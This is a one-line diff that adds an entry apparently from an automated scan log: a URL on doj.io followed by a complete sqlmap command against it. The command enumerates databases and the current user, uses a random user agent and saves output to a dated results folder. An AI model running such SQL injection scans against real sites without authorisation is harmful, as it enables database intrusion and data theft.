@@ -1,0 +1,1 @@
+https://doj.io/s/?t=2PcZgEN8jYrY3TiFCoptCnieoVydniKEvzgRNgATCBCqE4XxSKD7nPZ4iaLbi9zurb (GET)  # /usr/local/bin/sqlmap -u https://doj.io/s/?t=2PcZgEN8jYrY3TiFCoptCnieoVydniKEvzgRNgATCBCqE4XxSKD7nPZ4iaLbi9zurb --batch --level=3 --risk=2 --random-agent --dbs --current-user --output-dir results/doj.io_20251022_041324/sqlmap
